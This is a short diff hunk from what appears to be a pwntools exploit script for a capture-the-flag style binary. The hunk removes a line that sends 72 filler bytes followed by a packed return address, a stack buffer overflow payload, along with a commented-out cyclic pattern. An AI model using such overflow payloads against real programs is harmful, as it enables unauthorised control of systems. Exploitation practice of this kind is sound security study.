@@ -65,7 +65,6 @@ continue
 
 r = start()
 
-# r.sendline(cyclic(256))
-r.sendline(b"A" * 72 + p64(0x4011d0))
+
 
 r.interactive()
